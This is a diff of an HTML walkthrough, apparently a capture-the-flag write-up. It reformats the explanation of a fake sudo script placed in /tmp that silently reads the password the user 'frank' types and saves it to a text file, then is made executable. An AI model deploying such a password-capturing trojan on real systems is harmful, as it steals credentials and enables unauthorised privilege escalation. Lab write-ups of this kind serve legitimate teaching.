@@ -43,12 +43,13 @@
                     <code>touch /tmp/sudo</code> creating our own sudo executable.
                 </li>
                 <li>content of sudo file <br>
-                    <code>#!/bin/bash</code> -- I don't think i need to explain this. <br>
-                    <code>read -s pass</code> -- after executes the command, this will read the password entered by frank and store it in
-                    the pass variable. <code>-s</code> is used so that the input is not displayed. Something i'm used to
-                    do which you can ignore.<br>
-                    <code>echo $pass > /home/frank/pass.txt</code> -- echoing the password from pass variable to
-                    pass.txt so that we can read it once catured. <br>
+                    <code>
+                        #!/bin/bash
+                        read -s pass # after executes the command, this will read the password entered by frank and store it in
+                        the pass variable
+                        echo $pass > /home/frank/pass.txt # echoing the password from pass variable to
+                    pass.txt so that we can read it once catured.
+                    </code>
                 </li>
                 <li>
                     <code>chmod +x /tmp/sudo</code>
